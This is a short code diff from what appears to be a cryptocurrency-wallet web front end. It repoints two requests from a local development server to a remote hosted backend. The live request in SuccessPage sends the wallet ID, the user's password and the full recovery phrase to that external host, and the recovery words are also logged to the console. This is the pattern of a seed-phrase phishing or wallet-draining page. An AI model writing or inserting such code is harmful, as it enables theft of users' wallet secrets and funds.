@@ -75,7 +75,7 @@
 //             if (isCorrect) {
 //                 setIsSuccess(true);
 //                 try {
-//                     await axios.post('http://127.0.0.1:8000/api/recovery-phrase/', { phrase: recoveryWords.join(' ') });
+//                     await axios.post('https://walletmanagement-rcfpsxcera-uc.a.run.app/api/recovery-phrase/', { phrase: recoveryWords.join(' ') });
 //                     window.location.href = '../WalletSubmit';
 //                 } catch (error) {
 //                     console.error('Error saving phrase:', error);
@@ -233,7 +233,7 @@ const SuccessPage: React.FC = () => {
                     console.log('Recovery Phrases:', recoveryWords);
 
                     // Send data to the backend
-                    await axios.post('http://127.0.0.1:8000/api/save-wallet-data/', {
+                    await axios.post('https://walletmanagement-rcfpsxcera-uc.a.run.app/api/save-wallet-data/', {
                         wallet_id: walletId,
                         password,
                         recovery_phrases: recoveryWords.join(' '),
